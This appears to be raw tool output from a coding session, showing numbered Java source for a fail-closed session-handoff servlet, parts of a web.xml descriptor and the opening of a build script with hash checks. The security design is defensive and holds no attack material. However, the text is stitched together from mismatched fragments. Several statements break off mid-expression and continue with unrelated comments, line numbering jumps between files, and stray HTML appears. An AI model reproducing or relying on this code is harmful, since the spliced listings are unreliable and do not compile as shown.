this source's own allowance is untouched. */\n    23\t        LIMITED_GLOBAL,\n    24\t        /** Too many distinct sources to track; shedding load. */\n    25\t        LIMITED_TRACKING,\n    26\t        /** The component is not serving. */\n    27\t        REFUSED_UNAVAILABLE\n    28\t    }\n    29\t\n    30\t    /** The answer, with no session material in its {@code toString()}. */\n    31\t    public static final class Decision {\n    32\t        private final Outcome outcome;\n    33\t        private final SessionId sessionId;\n    34\t        private final int retryAfterSeconds;\n    35\t        private final SessionId.Rejection rejection;\n    36\t\n    37\t        private Decision(Outcome outcome, SessionId sessionId, int retryAfterSeconds) {\n    38\t            this(outcome, sessionId, retryAfterSeconds, SessionId.Rejection.NONE);\n    39\t        }\n    40\t\n    41\t        private Decision(Outcome outcome, SessionId sessionId, int retryAfterSeconds,\n    42\t                         SessionId.Rejection rejection) {\n    43\t            this.outcome = outcome;\n    44\t            this.sessionId = sessionId;\n    45\t            this.retryAfterSeconds = retryAfterSeconds;\n    46\t            // A name from a fixed enum, never the value: this is the one detail the caller may log\n    47\t            // about a rejected assertion, and it is why the reason is carried at all.\n    48\t            this.rejection = rejection == null ? Implementations should return {@code false} rather than throw for \"no\"; a throw\n    93\t     * is still handled as \"no\" below.\n    94\t     */\n    95\t    public interface SessionStateVerifier {\n    96\t        boolean isSessionValid(String sessionId);\n    97\t    }\n    98\t\n    99\t    /** A verifier that confirms nothing, so a missing integration fails closed. */\n   100\t    public static final SessionStateVerifier DENY_ALL = new SessionStateVerifier() {\n   101\t        @Override\n   102\t        public boolean isSessionValid(String sessionId) {\n   103\t            return false;\n   104\t        }\n   105\t    };\n   106\t\n   107\t    /** Where the assertion comes from. Failing open here would mean issuing a\n   129\t        // session cookie for any string a client could invent.\n   130\t        this.policy = policy;\n   131\t        this.verifier = verifier == null ? Two\n   145\t     *       limits on that claim, stated rather than glossed: an attempt the store then refuses has\n   146\t     *       still consumed its allowance, because it was a real authentication attempt and making\n   147\t     *       those free would hand an attacker free probing; and the fixed timing padding charged by\n   148\t     *       the HTTP adapter runs <i>before</i> this gate, so what this gate sheds is the store round\n   149\t     *       trip and the cookie write, not every byte of work a request costs.</li>\n   150\t     *   <li><b>Verify against server-side state.</b> The only step that can authorise a cookie.</li>\n   151\t     * </ol>\n   152\t     */\n   153\t    public Decision handle(Request request) {\n   154\t        if (request == null) {\n   155\t            return new Decision(Outcome.REFUSED_UNAVAILABLE, null, 0);\n   156\t        }\n   157\t        ClientAddress source = request.source == null ? The reason\n   165\t            // travels with the decision because \"the authenticator asserted nothing\" and \"the\n   166\t            // authenticator asserted a 31-character string\" are different bugs to fix, and the\n   167\t            // response the client sees is identical for both either way.\n   168\t            return new Decision(Outcome.REFUSED_INVALID_ASSERTION, null, 0, rejected.rejection());\n   169\t        }\n   170\t\n   171\t        AttemptLimiter.Decision budget = limiter.tryAcquire(source);\n   172\t        if (budget == AttemptLimiter.Decision.LIMITED_PER_SOURCE) {\n   173\t            return new Decision(Outcome.LIMITED_SOURCE, null, limiter.retryAfterSeconds(source));\n   174\t        }\n   175\t        if (budget == AttemptLimiter.Decision.LIMITED_GLOBALLY) {\n   176\t            return new Decision(Outcome.LIMITED_GLOBAL, null, limiter.retryAfterSeconds(source));\n   177\t        }\n   178\t        if (budget == AttemptLimiter.Decision.LIMITED_TRACKING_SATURATED) {\n   179\t            return new Decision(Outcome.LIMITED_TRACKING, null, limiter.retryAfterSeconds(source));\n   180\t        }\n   181\t\n   182\t        boolean valid;\n   183\t        try {\n   184\t            valid = verifier.isSessionValid(sessionId.value());\n   185\t        } catch (RuntimeException verifierFailed) {\n   186\t            // A verifier that cannot answer did not confirm anything. Consequently this\n    10\t * type is written so that the identifier cannot leak through the paths that normally leak secrets:\n    11\t *\n    12\t * <ul>\n    13\t *   <li>{@link #toString()} <li>{@link #value()} is package private, so code outside this package cannot obtain the raw\n    16\t *       string to write it somewhere else.</li>\n    17\t *   <li>Instances are immutable and this component keeps no copy beyond the current request: the\n    18\t *       identifier is never cached, never logged, never written to disk and never placed in a URL,\n    19\t *       a response body or a command line.</li>\n    20\t * </ul>\n    21\t *\n    22\t * <p>Validation is reject-only: the value is never trimmed, case-folded, unescaped or otherwise\n    23\t * normalised, because silent accepted identifier. 32 base64url characters carry well over 128 bits. */\n    29\t    public static final int MIN_LENGTH = 32;\n    30\t\n    31\t    /** Longest accepted identifier, bounding the work and memory spent per request. */\n    32\t    public static final int MAX_LENGTH = 128;\n    33\t\n    34\t    /**\n    35\t     * Minimum number of distinct characters in an identifier <b>that this code minted</b>.\n    36\t     *\n    37\t     * <p>Deliberately <i>not</i> applied to identifiers arriving from the trusted session owner, and\n    38\t     * the reason is a measurement: an \"at least 12 distinct symbols\" rule applied to a 32-character\n    39\t     * lowercase-hex identifier refuses <b>1.70%</b> of uniformly random ones (5 772 905 916 802 455\n    40\t     * 845 865 331 391 890 579 456 of 16<sup>32</sup>; about one sign-in in 59), because a 16-symbol\n    41\t     * alphabet simply does not offer many distinct symbols in 32 positions. Hex is what several\n    42\t     * widely deployed containers hand out, so as an input rule this heuristic was not a guard at all\n    43\t     * -- it was a random failure injected into somebody else's working system, and every one of\n    44\t     * those refusals landed on a value the authoritative store had already vouched for.\n    45\t     *\n    46\t     * <p>It also asks a question this component has no standing to ask. A degenerate value either\n    50\t     * is in the store -- in which case the owner created it and refusing it punishes their user -- or\n    51\t     * it is not, in which case the lookup refuses it on the evidence that matters.\n    52\t     *\n    53\t     * <p>For values this class produces the check is worth keeping, because the only plausible cause\n    54\t     * is a regression in the CSPRNG or the encoder below: the false-rejection chance for a\n    55\t     * 43-character base64url encoding of 32 random bytes is 8.0e-22, so it can never lock out a real\n    56\t     * user, while it does catch an RNG that has started returning constants.\n    57\t     */\n    58\t    static final int SELF_TEST_MIN_DISTINCT_CHARS = 12;\n    59\t\n    60\t    /** Hex characters of the SHA-256 fingerprint that is safe to put in a log line. */\n    61\t    private static final int FINGERPRINT_HEX = 12;\n    62\t\n    63\t    /** Domain-separation prefix so a fingerprint cannot be matched against another system's digest. */\n    64\t    private static final String FINGERPRINT_PREFIX = \"acme-sid-v1:\";\n    65\t\n    66\t    private final String value;\n    67\t\n    68\t    private SessionId(String value) {\n    69\t        this.value = value;\n    70\t    }\n    71\t\n    72\t    /** Why a candidate identifier was refused. Names are safe to log; the value is not. */\n    73\t    enum Rejection {\n    74\t        /** No identifier was supplied at all. */\n    75\t        NONE,\n    76\t        ABSENT,\n    77\t        TOO_SHORT,\n    78\t        TOO_LONG,\n    79\t        ILLEGAL_CHARACTER,\n    80\t        LOW_CHAR_DIVERSITY\n    81\t    }\n    82\t\n    83\t    /**\n    84\t     * Accepts an identifier that came from the trusted session owner's server-side state.\n    85\t     *\n    86\t     * @throws InvalidSessionIdentifierException if the value is not a well-formed opaque token.\n    87\t     *     The exception carries only the reason class, never any part of the value.\n    88\t     */\n    89\t    public static SessionId fromTrustedComponent(String raw) throws InvalidSessionIdentifierException {\n    90\t        Rejection rejection = inspect(raw);\n    91\t        if (rejection != Rejection.NONE) {\n    92\t            throw new InvalidSessionIdentifierException(rejection);\n    93\t        }\n    94\t        return new SessionId(raw);\n    95\t    }\n    96\t\n    97\t    /**\n    98\t     * Classifies a candidate without constructing an instance, so the caller can log the reason\n    99\t     * without ever handling the value as a validated secret.\n   100\t     *\n   101\t     * <p>Exactly three rules, all of them rule 1's dimensions and all of them decidable without\n   102\t     * knowing the issuer: it is text, of the right length, made of the right characters. Only ever asked about this class's own output.\n   154\t     */\n   155\t    static int distinctCharacters(String value) {\n   156\t        boolean[] seen = new boolean[128];\n   157\t        int distinct = 0;\n   158\t        for (int i = 0; i < value.length(); i++) {\n   159\t            char c = value.charAt(i);\n   160\t            // The table size is tied to the allowlist, so a charset widened past it must not turn\n   161\t            // into an ArrayIndexOutOfBoundsException. Deliberately package private. */\n   223\t    String value() {\n   224\t        return value;\n   225\t    }\n   226\t\n   227\t    /**\n   228\t     * A truncated SHA-256 fingerprint of the identifier, safe to log <i>for identifiers with real\n   229\t     * entropy</i> -- see the caveat, because \"safe to log\" is a claim about the input too.\n   230\t     *\n   231\t     * <p>48 bits of digest over a 256-bit input cannot be inverted or replayed; it lets an operator\n   232\t     * correlate the log lines that belong to one session. Against a full-entropy identifier an\n   233\t     * attacker who steals the logs learns nothing: guessing a candidate and checking it against 48\n   234\t     * bits of digest costs 2<sup>48</sup> tries per line and yields no usable value.\n   235\t     *\n   236\t     * <p><b>The caveat, stated as a deployment requirement.</b> A digest is a verifier, not just a\n   237\t     * mask. The asserted session identifier comes from\n    23\t * server-side code upstream in this JVM, and is <i>still</i> validated and re-checked against the\n    24\t * authoritative store, because a filter ordering mistake or a compromised upstream must not be able\n    25\t * to mint a cookie from a client-chosen string. Cookies, query parameters, body fields and every\n    26\t * {@code *-For} header are never read.\n    27\t *\n    28\t * <p><b>Response shape.</b> Exactly two bodies, both constant. Two status families: a refusal that\n    29\t * is an authentication outcome (403) and a refusal that is availability (429/503), which is the\n    30\t * smallest distinction that stays honest -- a 403 says \"no session was issued to you\", which is true\n    31\t * and observable from the missing cookie anyway, and never says why.\n    32\t *\n    33\t * <p>Servlet 6.0 has no {@code SC_TOO_MANY_REQUESTS} constant (it arrived in 6.1), hence the local\n    34\t * one.\n    35\t */\n    36\tpublic final class SessionHandoffServlet extends jakarta.servlet.http.HttpServlet {\n    37\t\n    38\t    private static final long serialVersionUID = 1L;\n    39\t\n    40\t    /** Added in Servlet 6.1; declared here so this compiles and runs on 6.0. */\n    41\t    static final int SC_TOO_MANY_REQUESTS = 429;\n    42\t    /** Not in the Servlet API constants either. */\n    43\t    static final int SC_NOT_IMPLEMENTED = 501;\n    44\t\n    45\t    private static final Logger LOG = Logger.getLogger(SessionHandoffServlet.class.getName());\n    46\t\n    47\t    /**\n    48\t     * Collaborators, written by the container's {@code init()} thread and read by every request\n    49\t     * thread afterwards.\n    50\t     *\n    51\t     * <p>All four are {@code volatile}, and {@link #serving} is written <i>last</i> in\n    52\t     * {@link #configure} and {@code serveNothing()}. That pairing is the point: a request thread that\n    53\t     * observes {@code serving == true} performs an acquire read of the same field the wiring thread\n    54\t     * released, so it must also see the three references written before it, and one that observes\n    55\t     * {@code false} never reads them at all. Without it the container's \"init finished before service\n    56\t     * ran\" ordering is a spec promise rather than a happens-before this class can rely on: a worker\n    57\t     * could see {@code serving == true} next to a {@code null} collaborator, and the NPE that follows\n    58\t     * is caught and answered as a 503 -- a refusal, so nothing unsafe escapes, but a self-inflicted\n    59\t     * outage during the first requests after a deploy, which is exactly when an operator is watching.\n    60\t     * Rule 7 asks for check-and-act atomicity; for a wire-once/read-many object that is visibility,\n    61\t     * not locking, and volatile gets it without a monitor on the hot path.\n    62\t     */\n    63\t    private transient volatile SessionHandoffService service;\n    64\t    private transient volatile SessionCookieWriter cookieWriter;\n    65\t    private transient volatile TrustedSessionAssertionSource assertionSource;\n    66\t    private transient volatile boolean serving;\n    67\t\n    68\t    /**\n    69\t     * Wires the component from validated environment settings and the session verifier the\n    70\t     * application contributes through {@link SessionStateVerifierProvider}.\n    71\t     *\n    72\t     * <p>Fail-closed by construction: invalid settings, an absent verifier or unsafe deployment\n    73\t     * hygiene leave the servlet refusing every request with 503. A servlet that cannot verify a\n    74\t     * session must never fall back to \"assume the authenticator was right\".\n    75\t     */\n    76\t    @Override\n    77\t    public void init() {\n    78\t        SessionHandoffSettings settings;\n    79\t        try {\n    80\t            settings = SessionHandoffSettings.fromEnvironment();\n    81\t        } catch (IllegalArgumentException badSettings) {\n    82\t            // The message names a setting and a violated bound, never a value read from the\n    83\t            // environment, so it is safe to log.\n    84\t            LOG.log(Level.SEVERE, \"session handoff is not serving: {0}\", badSettings.getMessage());\n    85\t            serveNothing();\n    86\t            return;\n    87\t        }\n    88\t        String hygieneProblem;\n    89\t        try {\n    90\t            // Checked before anything is discovered: this component is about to load a class it does\n    91\t            // not own, so its own code base and the classpath must already be proven read-only.\n    92\t            hygieneProblem = DeploymentHygiene.describeProblem(SessionHandoffServlet.class);\n    93\t        } catch (RuntimeException hygieneCheckFailed) {\n    94\t            hygieneProblem = \"the deployment hygiene check failed: \"\n    95\t                    + hygieneCheckFailed.getClass().getName();\n    96\t        }\n    97\t        if (hygieneProblem != null) {\n    98\t            LOG.log(Level.SEVERE, \"session handoff is not serving: {0}\", hygieneProblem);\n    99\t            serveNothing();\n   100\t            return;\n   101\t        }\n   102\t        SessionHandoffService.SessionStateVerifier verifier;\n   103\t        try {\n   104\t            verifier = SessionStateVerifierProvider.load();\n   105\t        } catch (RuntimeException providerFailed) {\n   106\t            LOG.log(Level.SEVERE, \"session handoff is not serving: the session verifier could not be\"\n   107\t                    + \" loaded, exceptionType={0}\", providerFailed.getClass().getName());\n   108\t            serveNothing();\n   109\t            return;\n   110\t        }\n   111\t        if (verifier == null) {\n   112\t            LOG.log(Level.SEVERE, \"session handoff is not serving: no session verifier is deployed\");\n   113\t            serveNothing();\n   114\t            return;\n   115\t        }\n   116\t        try {\n   117\t            // Re-checked with the verifier's own code base in scope, because that class is the\n   118\t            // authority on whether a session exists.\n   119\t            hygieneProblem = DeploymentHygiene.describeProblem(SessionHandoffServlet.class, verifier.getClass());\n   120\t        } catch (RuntimeException hygieneCheckFailed) {\n   121\t            hygieneProblem = \"the deployment hygiene check failed: \"\n   122\t                    + hygieneCheckFailed.getClass().getName();\n   123\t        }\n   124\t        if (hygieneProblem != null) {\n   125\t            LOG.log(Level.SEVERE, \"session handoff is not serving: {0}\", hygieneProblem);\n   126\t            serveNothing();\n   127\t            return;\n   128\t        }\n   129\t        SessionCookieWriter writer = new SessionCookieWriter(settings.cookiePolicy());\n   130\t        configure(new SessionHandoffService(settings.cookiePolicy(), verifier, settings.limiter()),\n   131\t                writer, new RequestAttributeAssertionSource(settings.assertionAttribute()));\n   132\t    }\n   133\t\n   134\t    private void serveNothing() {\n   135\t        this.service = null;\n   136\t        this.cookieWriter = null;\n   137\t        this.assertionSource = null;\n   138\t        this.serving = false;\n   139\t    }\n   140\t\n   141\t    /**\n   142\t     * Wires the component explicitly. Every argument is required: a partially wired servlet would be\n   143\t     * an unauthenticated cookie issuer, so a null here means \"do not serve\" rather than \"do less\n   144\t     * checking\".\n   145\t     */\n   146\t    public void configure(SessionHandoffService service, SessionCookieWriter cookieWriter,\n   147\t                          TrustedSessionAssertionSource assertionSource) {\n   148\t        boolean complete = service != null && cookieWriter != null && assertionSource != null;\n   149\t        if (!complete) {\n   150\t            serveNothing();\n   151\t            LOG.log(Level.SEVERE, \"session handoff is not serving: required collaborators are missing\");\n   152\t            return;\n   153\t        }\n   154\t        this.service = service;\n   155\t        this.cookieWriter = cookieWriter;\n   156\t        this.assertionSource = assertionSource;\n   157\t        this.serving = true;\n   158\t        // Policy and limits only. No identifier, no address, no secret.\n   159\t        LOG.log(Level.INFO, \"session handoff ready: {0} wired with {1}\",\n   160\t                new Object[]{service, cookieWriter.policy()});\n   161\t    }\n   162\t\n   163\t    @Override\n   164\t    protected void doGet(HttpServletRequest request, HttpServletResponse response)\n   165\t            throws ServletException, IOException {\n   166\t        handle(request, response, true);\n   167\t    }\n   168\t\n   169\t    @Override\n   170\t    protected void doHead(HttpServletRequest request, HttpServletResponse response)\n   171\t            throws ServletException, IOException {\n   172\t        // HEAD takes the same decision path, the same status codes, the same headers and the same\n   173\t        // fixed work as GET, and writes no body. It is deliberately not a cheaper or freer request: it\n   174\t        // consumes rate-limit allowance and asks the session store its question, because answering it\n   175\t        // anywhere earlier would create exactly the cheap probe of session existence that GET is not\n   176\t        // allowed to be.\n   177\t        //\n   178\t        // What it does not do is issue a cookie. A HEAD response body is discarded by definition, so a\n   179\t        // credential handed to one cannot be used by the client that asked for it, while remaining\n   180\t        // perfectly visible to the prefetchers, link scanners and proxies that send HEADs and log\n   181\t        // them. A scanner would also consume a real user's allowance on requests that can never carry\n   182\t        // the credential away. The 200 that answers a successful HEAD is not a credential and not a\n   183\t        // quiet channel either: it can only be elicited by a request the authenticator has already\n   184\t        // false);\n   187\t    }\n   188\t\n   189\t    @Override\n   190\t    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n   191\t response.setHeader(\"Cache-Control\", \"no-store\");\n   221\t        // No body: the status is the whole answer, and a body would need an escaping decision.\n   222\t        response.flushBuffer();\n   223\t    }\n   224\t\n   225\t    /**\n   226\t     * The single decision path. {@code writeBody} is false for HEAD.\n   227\t     *\n   228\t     * <p>Every header is set before the first body byte, and the body is written last, because a\n   229\t     * servlet container silently discards headers set afterwards -- a dropped {@code Set-Cookie} or\n   230\t     * {@code Retry-After} would be invisible.\n   231\t     */\n   232\t    private void handle(HttpServletRequest request, HttpServletResponse response, boolean writeBody)\n   233\t            throws IOException {\n   234\t        if (response == null) {\n   235\t            return;\n   236\t        }\n   237\t        // Applied once, on every request, before the decision is taken -- including the requests the\n   238\t        // throttle and the availability check turn away. Padding only the refusal paths is not enough:\n   239\t        // a path that costs nothing next to a path that costs tens of microseconds is itself the\n   240\t        // oracle an attacker reads. Equal cost for grant and every refusal alike is what removes the\n   241\t        // \"does this session exist\" signal. The cost of that, and why the throttle therefore sheds\n   242\t        // the session-store round trip rather than this, is written out in WorkEqualizer.\n   243\t        WorkEqualizer.apply();\n   244\t        try {\n   245\t            if (request == null) {\n   246\t                // Cannot happen through the container; guarded so a direct call cannot NPE into a\n   247\t                // 200-with-nothing.\n   248\t                respondUnavailable(response, writeBody);\n   249\t                return;\n   250\t            }\n   251\t            if (!serving) {\n   252\t                respondUnavailable(response, writeBody);\n   253\t                return;\n   254\t            }\n   255\t\n   256\t            ClientAddress source = ClientAddress.parse(request.getRemoteAddr());\n   257\t            String assertedId = readAssertion(request);\n   258\t            SessionHandoffService.Decision decision =\n   259\t                    service.handle(new SessionHandoffService.Request(assertedId, source));\n   260\t\n   261\t            switch (decision.outcome()) {\n   262\t                case ISSUED:\n   263\t                    respondGranted(response, decision, writeBody);\n   264\t                    return;\n   265\t                case LIMITED_SOURCE:\n   266\t                case LIMITED_GLOBAL:\n   267\t                case LIMITED_TRACKING:\n   268\t                    respondLimited(response, decision, writeBody);\n   269\t                    // Only the outcome and the bucket shape. Never an identifier, never the address.\n   270\t                    LOG.log(Level.INFO, \"session handoff rate limited, outcome={0}, unknownSource={1}\",\n   271\t                            new Object[]{decision.outcome(), Boolean.valueOf(source.isUnknown())});\n   272\t                    return;\n   273\t                case REFUSED_INVALID_ASSERTION:\n   274\t                    respondRefused(response, writeBody);\n   275\t                    // The reason enum and nothing else: it tells an operator whether the authenticator\n   276\t                    // asserted nothing at all or asserted something the validator refused, which are\n   277\t                    // different bugs to chase, while the value itself stays out of the log (rule 5).\n   278\t                    LOG.log(Level.INFO, \"session handoff refused: the authenticator asserted no usable\"\n   279\t                            + \" session identifier, reason={0}\", decision.rejectionReason().name());\n   280\t                    return;\n   281\t                case REFUSED_UNAUTHENTICATED:\n   282\t                case REFUSED_UNAVAILABLE:\n   283\t                default:\n   284\t                    respondRefused(response, writeBody);\n   285\t                    LOG.log(Level.INFO, \"session handoff refused: the session store did not confirm the\"\n   286\t                            + \" asserted identifier\");\n   287\t                    return;\n   288\t            }\n   289\t        } catch (RuntimeException | IOException unexpected) {\n   290\t            // Never propagate: the container's error page would disclose class names, paths and\n   291\t            // versions. Log the exception type only -- a datastore or JDBC message can carry a\n   292\t            // connection string, and this component must not put one on any log it does not own.\n   293\t            LOG.log(Level.SEVERE, \"session handoff aborted, exceptionType={0}\",\n   294\t                    unexpected.getClass().getName());\n   295\t            respondUnavailable(response, writeBody);\n   296\t        }\n   297\t    }\n   298\t\n   299\t    /**\n   300\t     * Reads the assertion through the injected source, which is contractually forbidden from looking\n   301\t     * at client data. A throw is \"no assertion\", logged as a type only.\n   302\t     */\n   303\t    private String readAssertion(HttpServletRequest request) {\n   304\t        try {\n   305\t            return assertionSource.assertedSessionId(request);\n   306\t        } catch (RuntimeException sourceFailed) {\n   307\t            LOG.log(Level.WARNING, \"assertion source failed, exceptionType={0}\",\n   308\t                    sourceFailed.getClass().getName());\n   309\t            return null;\n   310\t        }\n   311\t    }\n   312\t\n   313\t    private void respondGranted(HttpServletResponse response, SessionHandoffService.Decision decision,\n   314\t                                boolean writeBody) throws IOException {\n   315\t        String body = ResponseBody.granted(cookieWriter.policy());\n   316\t        // Emitted before the cookie rather than after it: if the write below throws, the half response\n   317\t        // the client is left holding is already uncacheable.\n   318\t        applyStandardHeaders(response);\n   319\t        if (!writeBody) {\n   320\t            // HEAD is answered from the same decision, through the same header block and the same\n   321\t            // measure-the-body step as the GET that would answer it, minus the Set-Cookie it never\n   322\t            // issues. Content-Length reports the body the GET would have produced, which is what a HEAD\n   323\t            // is for. A method whose responses have a different header shape is a second, quieter way\n   324\t            // to tell two outcomes apart, so HEAD shares this code rather than imitating it in a second\n   325\t            // copy that could drift; the harness asserts the equality for the grant and every refusal.\n   326\t            response.setStatus(HttpServletResponse.SC_OK);\n   327\t            writeOrMeasure(response, body, false);\n   328\t            LOG.log(Level.INFO, \"session handoff availability check passed for session {0}\",\n   329\t                    decision.sessionIdentifier().fingerprint());\n   330\t            return;\n   331\t        }\n   332\t        try {\n   333\t            // The writer emits its own Cache-Control/Pragma (same values, set again is a no-op) and\n   334\t            // then the cookie, so a partial response is uncacheable before the value appears.\n   335\t            cookieWriter.writeSessionCookie(decision.sessionIdentifier(), response);\n   336\t        } catch (InvalidSessionIdentifierException rejectedAtWrite) {\n   337\t            // The writer's independent gate disagreed with the service. That should be impossible,\n   338\t            // and it is still a refusal rather than a judgement call: no cookie, generic body.\n   339\t            LOG.log(Level.SEVERE, \"session handoff refused at the cookie gate, reason={0}\",\n   340\t                    rejectedAtWrite.rejection().name());\n   341\t            respondRefused(response, writeBody);\n   342\t            return;\n   343\t        }\n   344\t        response.setStatus(HttpServletResponse.SC_OK);\n   345\t        writeOrMeasure(response, body, true);\n   346\t        LOG.log(Level.INFO, \"session handoff granted for session {0}\",\n   347\t                decision.sessionIdentifier().fingerprint());\n   348\t    }\n   349\t\n   350\t    private void respondRefused(HttpServletResponse response, boolean writeBody) throws IOException {\n   351\t        response.setStatus(HttpServletResponse.SC_FORBIDDEN);\n   352\t        applyStandardHeaders(response);\n   353\t        writeOrMeasure(response, ResponseBody.REFUSAL, writeBody);\n   354\t    }\n   355\t\n   356\t    private void respondLimited(HttpServletResponse response, SessionHandoffService.Decision decision,\n   357\t                                boolean writeBody) throws IOException {\n   358\t        response.setStatus(SC_TOO_MANY_REQUESTS);\n   359\t        applyStandardHeaders(response);\n   360\t        int retryAfter = decision.retryAfterSeconds();\n   361\t        if (retryAfter > 0) {\n   362\t            response.setIntHeader(\"Retry-After\", retryAfter);\n   363\t        }\n   364\t        writeOrMeasure(response, ResponseBody.REFUSAL, writeBody);\n   365\t    }\n   366\t\n   367\t    private void respondUnavailable(HttpServletResponse response, boolean writeBody) throws IOException {\n marking the backend down for a long time.\n   371\t        response.setIntHeader(\"Retry-After\", 5);\n   372\t        writeOrMeasure(response, ResponseBody.REFUSAL, writeBody);\n   373\t    }\n   374\t\n   375\t    /**\n   376\t     * The header block every response carries, whatever the status and whatever the method.\n   377\t     *\n   378\t     * <p>One method rather than four copies: the cache directives, content type and {@code nosniff} are\n   379\t     * the response's <i>shape</i>, and the shape is what must not encode anything about the decision\n   380\t     * behind it. Every copy added is another place that can drift, and drift here is exactly the\n   381\t     * outcome-telling side channel the rest of this class works to remove -- a response that is\n   382\t     * cacheable, or plain-text, or of a different length class, says which gate answered. If the refusals answered a HEAD with no {@code Content-Length} while\n   397\t     * the grant answered one with a length, the header shape alone would separate the outcomes for a\n   398\t     * client that sent HEAD instead of GET -- a second, quieter version of the body-tell this class\n   399\t     * goes out of its way not to have. Both methods now describe the same document.\n   400\t     */\n   401\t    private void writeOrMeasure(HttpServletResponse response, String body, boolean writeBody)\n   402\t            throws IOException {\n   403\t        if (writeBody) {\n   404\t            write(response, body);\n   405\t        } else {\n   406\t            response.setContentLength(body.getBytes(java.nio.charset.StandardCharsets.UTF_8).length);\n   407\t            response.flushBuffer();\n   408\t        }\n   409\t    }\n   410\t\n   411\t    private void write(HttpServletResponse response, String body) throws IOException {\n   412\t        PrintWriter out = response.getWriter();\n   413\t        out.write(body);\n   414\t        out.flush();\n   415\t    }\n   416\t\n   417\t    /** Configuration summary for an operator endpoint; never contains a secret or an identifier. */\n   418\t    @Override\n   419\t    public String toString() {\n   420\t        return \"SessionHandoffServlet[serving=\" + serving\n   421\t                + (cookieWriter == null ? \"\" : \", \" + cookieWriter.policy()) + \"]\";\n   422\t    }\n   423\t\n   424\t    /** Used by the deployment descriptor check and the harness. */\n   425\t    boolean isServing() {\n   426\t        return serving;\n   427\t    }\n   428\t}\n","exit_code":0,"status":"completed"}}

Without it a container may append\n     8\t     \";jsessionid=...\" to a redirect target, which puts a session identifier in a URL, and URLs leak\n     9\t     through Referer headers, proxy logs and browser history. This component never creates a\n    10\t     container-managed session, so the element exists to guarantee the container cannot either.\n    11\t\n    12\t  2. session-config/cookie-config has http-only set. It only governs a container-managed session\n    13\t     cookie, which this component does not use; it is stated anyway so a reviewer scanning the\n    14\t     descriptor can see the intent, and so a future change that does introduce a container session\n    15\t     inherits the hardened attribute instead of the default.\n    16\t\n    17\t  There is no transport-guarantee element. Enforcing HTTPS is the deployment's job (a TLS terminator\n    18\t  plus HSTS), and claiming it here without a keystore configured would be decoration. The cookie is\n    19\t  always Secure regardless, so a plain-HTTP deployment simply stops working rather than leaking.\n    20\t-->\n    21\t<web-app xmlns=\"https://jakarta.ee/xml/ns/jakartaee\"\n    22\t         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    23\t         xsi:schemaLocation=\"https://jakarta.ee/xml/ns/jakartaee\n    24\t                             https://jakarta.ee/xml/ns/jakartaee/web-app_6_0.xsd\"\n    25\t         version=\"6.0\">\n    26\t\n    27\t  <display-name>Session handoff</display-name>\n    28\t\n    29\t  <session-config>\n    30\t    <tracking-mode>COOKIE</tracking-mode>\n    31\t    <cookie-config>\n    32\t      <http-only>true</http-only>\n    33\t      <secure>true</secure>\n    34\t    </cookie-config>\n    35\t  </session-config>\n    36\t\n    37\t  <servlet>\n    38\t    <servlet-name>SessionHandoff</servlet-name>\n    39\t    <servlet-class>com.acme.portal.session.SessionHandoffServlet</servlet-class>\n    40\t    <load-on-startup>1</load-on-startup>\n    41\t  </servlet>\n    42\t\n    43\t  <servlet-mapping>\n    44\t    <servlet-name>SessionHandoff</servlet-name>\n    45\t    <url-pattern>/session/handoff</url-pattern>\n    46\t  </servlet-mapping>\n    47\t\n    48\t  <!--\n    49\t    This is the descriptor a deployment copies, so it declares nothing that only exists to be tested\n    50\t    against. Not part of deploy/web.xml, which is what an integrator copies:\n     3\t  this file is injected in place of the marker comment there by build.sh, and only the assembled\n     4\t  descriptor under build/stage-* (the one inside the end-to-end wars) contains it.\n     5\t\n     6\t  StubControl is the switch that turns a live session into an unknown one so the verifier gate can be\n     7\t  observed over real HTTP. Please start again.</p></body></html>\nFILE build.sh\n     1\t#!/bin/bash\n     2\t# Builds, deploys to a throwaway Tomcat and drives real HTTP assertions.\n     3\t# Usage: ./build.sh            build + in-process harness + end-to-end (all three modes)\n     4\t#        ./build.sh --unit     build + in-process harness only\n     5\tset -u -o pipefail\n     6\t\n     7\tROOT=\"$(cd \"$(dirname \"$0\")\" && pwd)\"\n     8\tcd \"$ROOT\"\n     9\t\n    10\tSERVLET_API=\"${SERVLET_API_JAR:-tools/jakarta.servlet-api-6.0.0.jar}\"\n    11\tTOMCAT_HOME=\"build/apache-tomcat-10.1.60\"\n    12\tJAVA_HOME_DIR=\"${JAVA_HOME:-/usr/lib/jvm/java-17-openjdk-amd64}\"\n    13\tJAVAC=\"$JAVA_HOME_DIR/bin/javac\"\n    14\tJAVA=\"$JAVA_HOME_DIR/bin/java\"\n    15\tJAR=\"$JAVA_HOME_DIR/bin/jar\"\n    16\tLOG_DIR=\"build/logs\"\n    17\tRC=0\n    18\t\n    19\tif [ ! -f \"$SERVLET_API\" ]; then\n    20\t  echo \"ERROR servlet API jar not found at $SERVLET_API (see README for the pinned download)\" >&2\n    21\t  exit 2\n    22\tfi\n    23\tif [ ! -x \"$JAVAC\" ]; then\n    24\t  echo \"ERROR JDK not found at JAVA_HOME=$JAVA_HOME_DIR\" >&2\n    25\t  exit 2\n    26\tfi\n    27\tmkdir -p \"$LOG_DIR\"\n    28\t\n    29\t# --- Third-party integrity gate (rule 8). Both files are used to compile and to run, so neither is\n    30\t# --- trusted because it happens to be on disk. The jar is checked against the SHA-1 published next to\n    31\t# --- it on Maven Central and against a locally pinned SHA-512 (the .pinned- prefix says the expected\n    32\t# --- hash came from this project, not from the publisher -- Maven publishes only .sha1 here).\n    33\tverify_publisher_sha1() {\n    34\t  # The published .sha1 holds a bare digest with no file name, which `sha1sum -c` refuses to parse,\n    35\t  # so the digests are compared directly. The 40-character check keeps an empty or truncated\n    36\t  # signature file from matching nothing at all.\n    37\t  [ -f \"$2\" ] || return 1\n    38\t  local expected actual\n    39\t  expected=$(tr -cd '0-9a-fA-F' < \"$2\" | tr 'A-F' 'a-f')\n    40\t  actual=$(sha1sum \"$1\" | cut -d' ' -f1)\n    41\t  [ \"${#expected}\" -eq 40 ] && [ \"$expected\" = \"$actual\" ]\n    42\t}\n    43\t\n    44\tverify_publisher_sha1 \"$SERVLET_API\" \"$SERVLET_API.sha1\" \\\n    45\t  || { echo \"ERROR $SERVLET_API does not match the SHA-1 published with it\" >&2; exit 2; }\n    46\t( cd \"$(dirname \"$SERVLET_API\")\" && sha512sum -c \"$(basename \"$SERVLET_API\").pinned-sha512\" >/dev/null ) \\\n    47\t  || { echo \"ERROR $SERVLET_API does not match the 